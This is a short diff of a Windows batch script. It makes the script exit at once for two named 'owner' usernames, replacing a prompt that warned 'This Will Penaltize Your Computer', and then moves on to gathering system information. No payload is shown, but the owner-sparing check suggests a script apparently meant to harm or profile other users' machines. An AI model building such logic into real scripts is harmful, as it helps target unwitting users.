@@ -9,15 +9,11 @@ set "downloads_path=%USERPROFILE%\Downloads"
 set "user_name=%USERNAME%"
 
 if /I "%user_name%"=="princ" (
-    echo This Will Penaltize Your Computer. Are You Sure? Owner.
-    set /p confirm=Type "yes" to continue, "no" to cancel: 
-    if /I "%confirm%"=="no" exit
+   exit
 )
 
 if /I "%user_name%"=="adisa" (
-    echo This Will Penaltize Your Computer. Are You Sure? Owner.
-    set /p confirm=Type "yes" to continue, "no" to cancel: 
-    if /I "%confirm%"=="no" exit
+   exit
 )
 
 echo Gathering system information...
